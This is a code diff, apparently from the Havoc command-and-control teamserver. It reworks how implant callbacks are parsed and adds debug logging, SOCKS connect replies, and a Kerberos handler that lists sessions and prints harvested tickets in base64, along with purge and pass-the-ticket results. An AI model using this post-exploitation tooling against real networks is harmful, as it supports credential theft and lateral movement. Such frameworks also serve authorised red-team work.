+								"Type":    "Error",
+								"Message": fmt.Sprintf("Couldn't resume download %x: Download does not exists", FileID),
+							}
 						}
 					} else {
 						Message = map[string]string{
 							"Type":    "Error",
-							"Message": fmt.Sprintf("Couldn't resume download %x: Download does not exists", FileID),
+							"Message": fmt.Sprintf("Couldn't resume download %x: FileID not found", FileID),
 						}
 					}
+
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_RESUME, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Error",
-						"Message": fmt.Sprintf("Couldn't resume download %x: FileID not found", FileID),
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x2 (resume). Expected at least 8 bytes but received %v bytes", Parser.Length()),
 					}
 				}
+				a.RequestCompleted(RequestID)
+				break
 
-			} else {
-				Message = map[string]string{
-					"Type":    "Error",
-					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x2 (resume). Expected at least 8 bytes but received %v bytes", Parser.Length()),
-				}
-			}
+			case DEMON_COMMAND_TRANSFER_REMOVE:
 
-			break
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Found  = Parser.ParseInt32()
+						FileID = Parser.ParseInt32()
+					)
 
-		case 0x3: /* transfer remove */
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_REMOVE, Found: %d, FileID: %x", AgentID, Found, FileID))
 
-			if Parser.Length() >= 8 {
-				var (
-					Found  = Parser.ParseInt32()
-					FileID = Parser.ParseInt32()
-				)
-
-				if Found == win32.TRUE {
-					if download := a.DownloadGet(FileID); download != nil {
-						Message = map[string]string{
-							"Type":    "Good",
-							"Message": fmt.Sprintf("Successful found and removed download: %x", FileID),
+					if Found == win32.TRUE {
+						if download := a.DownloadGet(FileID); download != nil {
+							Message = map[string]string{
+								"Type":    "Good",
+								"Message": fmt.Sprintf("Successful found and removed download: %x", FileID),
+							}
+						} else {
+							Message = map[string]string{
+								"Type":    "Error",
+								"Message": fmt.Sprintf("Couldn't remove download %x: Download does not exists", FileID),
+							}
 						}
 					} else {
 						Message = map[string]string{
 							"Type":    "Error",
-							"Message": fmt.Sprintf("Couldn't remove download %x: Download does not exists", FileID),
+							"Message": fmt.Sprintf("Couldn't remove download %x: FileID not found", FileID),
 						}
 					}
+
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_REMOVE, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Error",
-						"Message": fmt.Sprintf("Couldn't remove download %x: FileID not found", FileID),
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x3 (remove). Expected at least 8 bytes but received %v bytes", Parser.Length()),
 					}
 				}
+				a.RequestCompleted(RequestID)
+				break
 
-			} else {
-				Message = map[string]string{
-					"Type":    "Error",
-					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x3 (remove). Expected at least 8 bytes but received %v bytes", Parser.Length()),
-				}
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - UNKNOWN (%d)", AgentID, SubCommand))
+
 			}
 
-			break
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER, Invalid packet", AgentID))
 		}
-
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -4035,13 +5290,14 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 			Message    map[string]string
 		)
 
-		if Parser.Length() >= 4 {
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
 			SubCommand = Parser.ParseInt32()
 
 			switch SubCommand {
 			case SOCKET_COMMAND_RPORTFWD_ADD:
 
-				if Parser.Length() >= 16 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 
 					var (
 						SocktID = 0
@@ -4062,6 +5318,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					FwdAddr = Parser.ParseInt32()
 					FwdPort = Parser.ParseInt32()
 
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_ADD, Success: %d, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, Success, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
+
 					LclString = common.Int32ToIpString(int64(LclAddr))
 					FwdString = common.Int32ToIpString(int64(FwdAddr))
 
@@ -4076,6 +5334,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					}
 
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_ADD, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Error",
 						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_ADD : 0x0) expected at least 16 bytes but received %v bytes", Parser.Length()),
@@ -4085,6 +5344,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 				break
 
 			case SOCKET_COMMAND_RPORTFWD_LIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_LIST", AgentID))
 
 				var (
 					FwdList  string
@@ -4095,7 +5355,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 				FwdList += fmt.Sprintf(" %-12s %s\n", "Socket ID", "Forward")
 				FwdList += fmt.Sprintf(" %-12s %s\n", "---------", "-------")
 
-				for Parser.Length() != 0 {
+				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						SocktID = 0
 						LclAddr = 0
@@ -4121,11 +5381,12 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 				}
 
 				a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("reverse port forwards [%d active]:", FwdCount), FwdList)
-				return
+				a.RequestCompleted(RequestID)
+				break
 
 			case SOCKET_COMMAND_RPORTFWD_REMOVE:
 
-				if Parser.Length() >= 20 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 
 					var (
 						SocktID = 0
@@ -4144,6 +5405,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					FwdAddr = Parser.ParseInt32()
 					FwdPort = Parser.ParseInt32()
 
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
+
 					LclString = common.Int32ToIpString(int64(LclAddr))
 					FwdString = common.Int32ToIpString(int64(FwdAddr))
 
@@ -4156,19 +5419,22 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					a.PortFwdClose(SocktID)
 
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Info",
 						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_REMOVE : 0x4) expected at least 20 bytes but received %v bytes", Parser.Length()),
 					}
 				}
-
+				a.RequestCompleted(RequestID)
 				break
 
 			case SOCKET_COMMAND_RPORTFWD_CLEAR:
 
-				if Parser.Length() >= 4 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
 					var Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_CLEAR, Success: %d", AgentID, Success))
 
 					if Success == win32.TRUE {
 						Message = map[string]string{
@@ -4182,20 +5448,22 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						}
 					}
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_CLEAR, Invalid packet", AgentID))
 					Message = map[string]string{
 						"Type":    "Info",
 						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_CLEAR : 0x3) expected at least 4 bytes but received %v bytes", Parser.Length()),
 					}
 				}
-
+				a.RequestCompleted(RequestID)
 				break
 
 			case SOCKET_COMMAND_SOCKSPROXY_ADD:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_SOCKSPROXY_ADD", AgentID))
 				break
 
 			case SOCKET_COMMAND_OPEN:
 
-				if Parser.Length() >= 16 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 
 					var (
 						SocktID = 0
@@ -4212,6 +5480,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					LclPort = Parser.ParseInt32()
 					FwdAddr = Parser.ParseInt32()
 					FwdPort = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
 
 					FwdString = common.Int32ToIpString(int64(FwdAddr))
 					FwdString = fmt.Sprintf("%s:%d", FwdString, FwdPort)
@@ -4274,6 +5544,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 					}()
 
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, Invalid packet", AgentID))
 				}
 
 				break
@@ -4282,12 +5554,14 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 				/* if we receive the SOCKET_COMMAND_READ_WRITE command
 				 * that means that we should read the callback and send it to the forwared host/socks proxy */
 
-				if Parser.Length() >= 8 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
 					var (
 						Id   = Parser.ParseInt32()
 						Type = Parser.ParseInt32()
 						Data = Parser.ParseBytes()
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ_WRITE, Id: %x, Type: %d, DataLength: %x", AgentID, Id, Type, len(Data)))
 
 					if Type == SOCKET_TYPE_CLIENT {
 
@@ -4318,7 +5592,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
 
 								/* TODO: remove socks proxy client */
-								a.SocksClientClose(SOCKET_TYPE_CLIENT)
+								//a.SocksClientClose(SOCKET_TYPE_CLIENT)
 
 								return
 							}
@@ -4331,18 +5605,22 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 					}
 
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ_WRITE, Invalid packet", AgentID))
 				}
 
 				break
 
 			case SOCKET_COMMAND_CLOSE:
 
-				if Parser.Length() >= 8 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						SockId = Parser.ParseInt32()
 						Type   = Parser.ParseInt32()
 						Socket *PortFwd
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE, SockId: %x, Type: %d", AgentID, SockId, Type))
 
 					/* NOTE: for now the reverse port forward close command is not used. */
 					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {
@@ -4367,38 +5645,46 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						if Client := a.SocksClientGet(SockId); Client != nil {
 
 							/* lets remove it */
-							a.SocksClientClose(SockId)
+							a.SocksClientClose(int32(SockId))
 
 						}
 
 					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE, Invalid packet", AgentID))
 				}
 
 				break
 
 			case SOCKET_COMMAND_CONNECT:
 
-				if Parser.Length() >= 4 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 
 					var (
-						Success  = Parser.ParseInt32()
-						SocketId = Parser.ParseInt32()
+						Success   = Parser.ParseInt32()
+						SocketId  = Parser.ParseInt32()
+						ErrorCode = Parser.ParseInt32()
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Success: %d, SocketId: %x", AgentID, Success, SocketId))
 
 					if Client := a.SocksClientGet(SocketId); Client != nil {
 
 						if Success == win32.TRUE {
-
-							_, err := Client.Conn.Write([]byte{0x00, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+							// succeeded
+							err := socks.SendConnectSuccess(Client.Conn, Client.ATYP, Client.IpDomain, Client.Port)
 							if err != nil {
 								return
 							}
 							Client.Connected = true
 
 						} else {
+							a.SocksClientClose(int32(SocketId))
 
-							a.SocksClientClose(SocketId)
-
+							err := socks.SendConnectFailure(Client.Conn, uint32(ErrorCode))
+							if err != nil {
+								return
+							}
 						}
 
 					} else {
@@ -4407,12 +5693,18 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 					}
 
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Invalid packet", AgentID))
 				}
 
 				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - UNKNOWN (%d)", AgentID, SubCommand))
 			}
 
 		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET, Invalid packet", AgentID))
 			Message = map[string]string{
 				"Type":    "Error",
 				"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET expected at least 4 bytes but received %v bytes", Parser.Length()),
@@ -4423,9 +5715,353 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 		break
 
+	case COMMAND_KERBEROS:
+
+		var (
+			SubCommand int
+			Message    map[string]string
+			HighPart   int
+			LowPart    int
+			Success    int
+		)
+
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+			SubCommand = Parser.ParseInt32()
+
+			switch SubCommand {
+
+			case KERBEROS_COMMAND_LUID:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+					Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_LUID, Success: %d", AgentID, Success))
+
+					if Success == win32.TRUE {
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+
+							HighPart = Parser.ParseInt32()
+							LowPart  = Parser.ParseInt32()
+
+							Message = map[string]string{
+								"Type":    "Good",
+								"Message": fmt.Sprintf("Current LogonId: %x:0x%x", HighPart, LowPart),
+							}
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_LUID, Invalid packet", AgentID))
+						}
+
+					} else {
+						Message = map[string]string{
+							"Type":    "Erro",
+							"Message": "Failed to obtain the current logon ID",
+						}
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_LUID, Invalid packet", AgentID))
+				}
+
+			case KERBEROS_COMMAND_KLIST:
+
+				var (
+					NumSessions           int
+					NumTickets            int
+					Output                string
+					UserName              string
+					Domain                string
+					LogonIdLow            int
+					LogonIdHigh           int
+					Session               int
+					UserSID               string
+					LogonTimeLow          int
+					LogonTimeHigh         int
+					LogonTime             int64
+					LogonType             int
+					AuthenticationPackage string
+					LogonServer           string
+					LogonServerDNSDomain  string
+					Upn                   string
+					ClientName            string
+					ClientRealm           string
+					ServerName            string
+					ServerRealm           string
+					StartTime             int64
+					StartTimeLow          int
+					StartTimeHigh         int
+					EndTime               int64
+					EndTimeLow            int
+					EndTimeHigh           int
+					RenewTime             int64
+					RenewTimeLow          int
+					RenewTimeHigh         int
+					EncryptionType        int
+					TicketFlags           int
+					TicketFlagsStr        string
+					Ticket                []byte
+				)
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+					Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_KLIST, Success: %d", AgentID, Success))
+
+					if Success == win32.TRUE {
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+							NumSessions = Parser.ParseInt32()
+
+							for NumSessions > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes}) {
+
+								UserName              = Parser.ParseUTF16String()
+								Domain                = Parser.ParseUTF16String()
+								LogonIdLow            = Parser.ParseInt32()
+								LogonIdHigh           = Parser.ParseInt32()
+								Session               = Parser.ParseInt32()
+								UserSID               = Parser.ParseUTF16String()
+								LogonTimeLow          = Parser.ParseInt32()
+								LogonTimeHigh         = Parser.ParseInt32()
+								LogonType             = Parser.ParseInt32()
+								AuthenticationPackage = Parser.ParseUTF16String()
+								LogonServer           = Parser.ParseUTF16String()
+								LogonServerDNSDomain  = Parser.ParseUTF16String()
+								Upn                   = Parser.ParseUTF16String()
+
+								LogonTypes := map[int]string{
+									win32.LOGON32_LOGON_INTERACTIVE: "Interactive",
+									win32.LOGON32_LOGON_NETWORK: "Network",
+									win32.LOGON32_LOGON_BATCH: "Batch",
+									win32.LOGON32_LOGON_SERVICE: "Service",
+									win32.LOGON32_LOGON_UNLOCK: "Unlock",
+									win32.LOGON32_LOGON_NETWORK_CLEARTEXT: "Network_Cleartext",
+									win32.LOGON32_LOGON_NEW_CREDENTIALS: "New_Credentials",
+								}
+
+								// go from FILETIME to SYSTEMTIME
+								LogonTime = int64( ( ( ( LogonTimeHigh << ( 4 * 8 ) ) | LogonTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
+
+								Output += fmt.Sprintf("UserName                : %s\n", UserName)
+								Output += fmt.Sprintf("Domain                  : %s\n", Domain)
+								Output += fmt.Sprintf("LogonId                 : %x:0x%x\n", LogonIdHigh, LogonIdLow)
+								Output += fmt.Sprintf("Session                 : %d\n", Session)
+								Output += fmt.Sprintf("UserSID                 : %s\n", UserSID)
+								Output += fmt.Sprintf("LogonTime               : %s\n", time.Unix(LogonTime, 0))
+								Output += fmt.Sprintf("Authentication package  : %s\n", AuthenticationPackage)
+								Output += fmt.Sprintf("LogonType               : %s\n", LogonTypes[LogonType])
+								Output += fmt.Sprintf("LogonServer             : %s\n", LogonServer)
+								Output += fmt.Sprintf("LogonServerDNSDomain    : %s\n", LogonServerDNSDomain)
+								Output += fmt.Sprintf("UserPrincipalName       : %s\n", Upn)
+
+								if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+									NumTickets = Parser.ParseInt32()
+									Output += fmt.Sprintf("Cached tickets:         : %d\n", NumTickets)
+
+									for NumTickets > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
+
+										ClientName     = Parser.ParseUTF16String()
+										ClientRealm    = Parser.ParseUTF16String()
+										ServerName     = Parser.ParseUTF16String()
+										ServerRealm    = Parser.ParseUTF16String()
+										StartTimeLow   = Parser.ParseInt32()
+										StartTimeHigh  = Parser.ParseInt32()
+										EndTimeLow     = Parser.ParseInt32()
+										EndTimeHigh    = Parser.ParseInt32()
+										RenewTimeLow   = Parser.ParseInt32()
+										RenewTimeHigh  = Parser.ParseInt32()
+										EncryptionType = Parser.ParseInt32()
+										TicketFlags    = Parser.ParseInt32()
+										Ticket         = Parser.ParseBytes()
+
+										// go from FILETIME to SYSTEMTIME
+										StartTime = int64( ( ( ( StartTimeHigh << ( 4 * 8 ) ) | StartTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
+										EndTime   = int64( ( ( (   EndTimeHigh << ( 4 * 8 ) ) | EndTimeLow )   - 0x019DB1DED53E8000 ) / 10000000 )
+										RenewTime = int64( ( ( ( RenewTimeHigh << ( 4 * 8 ) ) | RenewTimeLow ) - 0x019DB1DED53E8000 ) / 10000000 )
+
+										EncryptionTypes := map[int]string{
+											win32.DES_CBC_CRC:                  "DES_CBC_CRC",
+											win32.DES_CBC_MD4:                  "DES_CBC_MD4",
+											win32.DES_CBC_MD5:                  "DES_CBC_MD5",
+											win32.DES3_CBC_MD5:                 "DES3_CBC_MD5",
+											win32.DES3_CBC_SHA1:                "DES3_CBC_SHA1",
+											win32.DSAWITHSHA1_CMSOID:           "DSAWITHSHA1_CMSOID",
+											win32.MD5WITHRSAENCRYPTION_CMSOID:  "MD5WITHRSAENCRYPTION_CMSOID",
+											win32.SHA1WITHRSAENCRYPTION_CMSOID: "SHA1WITHRSAENCRYPTION_CMSOID",
+											win32.RC2CBC_ENVOID:                "RC2CBC_ENVOID",
+											win32.RSAENCRYPTION_ENVOID:         "RSAENCRYPTION_ENVOID",
+											win32.RSAES_OAEP_ENV_OID:           "RSAES_OAEP_ENV_OID",
+											win32.DES3_CBC_SHA1_KD:             "DES3_CBC_SHA1_KD",
+											win32.AES128_CTS_HMAC_SHA1:         "AES128_CTS_HMAC_SHA1",
+											win32.AES256_CTS_HMAC_SHA1:         "AES256_CTS_HMAC_SHA1",
+											win32.RC4_HMAC:                     "RC4_HMAC",
+											win32.RC4_HMAC_EXP:                 "RC4_HMAC_EXP",
+											win32.SUBKEY_KEYMATERIAL:           "SUBKEY_KEYMATERIAL",
+											win32.OLD_EXP:                      "OLD_EXP",
+										}
+
+										TicketFlagTypes := []string{
+											"name_canonicalize", 
+											"anonymous", 
+											"ok_as_delegate",
+											"?",
+											"hw_authent",
+											"pre_authent",
+											"initial",
+											"renewable",
+											"invalid",
+											"postdated",
+											"may_postdate",
+											"proxy",
+											"proxiable",
+											"forwarded",
+											"forwardable",
+											"reserved",
+										}
+
+										TicketFlagsStr = ""
+
+										for i := 0; i < 16; i++ {
+											if ((TicketFlags >> (i  + 16)) & 1) == 1 {
+												TicketFlagsStr += " " + TicketFlagTypes[i]
+											}
+										}
+
+										TicketFlagsStr += fmt.Sprintf(" (0x%x)", TicketFlags)
+
+										Output += "\n"
+										Output += fmt.Sprintf("\tClient name     : %s @ %s\n", ClientName, ClientRealm)
+										Output += fmt.Sprintf("\tServer name     : %s @ %s\n", ServerName, ServerRealm)
+										Output += fmt.Sprintf("\tStart time      : %s\n", time.Unix(StartTime, 0))
+										Output += fmt.Sprintf("\tEnd time        : %s\n", time.Unix(EndTime, 0))
+										Output += fmt.Sprintf("\tRewnew time     : %s\n", time.Unix(RenewTime, 0))
+										Output += fmt.Sprintf("\tEncryption type : %s\n", EncryptionTypes[EncryptionType])
+										Output += fmt.Sprintf("\tFlags           :%s\n", TicketFlagsStr)
+										if len(Ticket) > 0 {
+											Output += fmt.Sprintf("\tTicket          : %s\n", base64.StdEncoding.EncodeToString(Ticket))
+										}
+
+										NumTickets -= 1
+									}
+								} else {
+									logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
+								}
+
+								Output += "\n"
+
+								NumSessions -= 1
+							}
+
+							Message = map[string]string{
+								"Type":    "Info",
+								"Output":  Output,
+							}
+							a.RequestCompleted(RequestID)
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
+						}
+
+					} else {
+						Message = map[string]string{
+							"Type":    "Erro",
+							"Message": "Failed to list all kerberos tickets",
+						}
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
+				}
+
+				break
+
+			case KERBEROS_COMMAND_PURGE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+					Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_PURGE, Success: %d", AgentID, Success))
+
+					if Success == win32.TRUE {
+
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": "Successfully purged the Kerberos ticket",
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Erro",
+							"Message": "Failed to purge the kerberos ticket",
+						}
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_PURGE, Invalid packet", AgentID))
+				}
+
+			case KERBEROS_COMMAND_PTT:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+					Success = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_PTT, Success: %d", AgentID, Success))
+
+					if Success == win32.TRUE {
+
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": "Successfully imported the Kerberos ticket",
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Erro",
+							"Message": "Failed to import the kerberos ticket",
+						}
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_PTT, Invalid packet", AgentID))
+				}
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - UNKNOWN (%d)", AgentID, SubCommand))
+			}
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS, Invalid packet", AgentID))
+		}
+
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
+		break
+
+	case COMMAND_MEM_FILE:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+			var (
+				MemFileID = Parser.ParseInt32()
+				Success   = Parser.ParseInt32()
+			)
+
+			// TODO: don't ignore this packet?
+			//       if this fails, then inline-execute, dotnet, or upload will show the error
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Success: %d, MemFileID: %x", AgentID, Success, MemFileID))
+			a.RequestCompleted(RequestID)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Invalid packet", AgentID))
+		}
+
 	default:
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: UNKNOWN (%d))", AgentID, CommandID))
 		/* end of the switch case output parser */
 		break
+	}
+
+	if Parser.Length() > 0 {
+		logger.Debug(fmt.Sprintf("Agent: %x, %d bytes were left unread", AgentID, Parser.Length()))
 	}
 }
 
